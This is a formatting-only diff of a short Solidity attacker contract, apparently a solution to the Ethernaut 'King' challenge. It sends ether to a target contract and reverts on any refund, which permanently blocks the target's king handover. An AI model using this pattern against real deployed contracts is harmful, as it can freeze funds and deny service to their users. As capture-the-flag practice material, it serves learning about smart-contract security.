@@ -2,14 +2,14 @@
 pragma solidity ^0.8.15;
 
 contract KingAttacker {
-  constructor() {}
+    constructor() {}
 
-  function attack(address payable targetAddress) public payable {
-    (bool sent, ) = targetAddress.call{value: msg.value}("");
-    require(sent, "Failed to sent");
-  }
+    function attack(address payable targetAddress) public payable {
+        (bool sent,) = targetAddress.call{value: msg.value}("");
+        require(sent, "Failed to sent");
+    }
 
-  fallback() external {
-    revert();
-  }
+    fallback() external {
+        revert();
+    }
 }
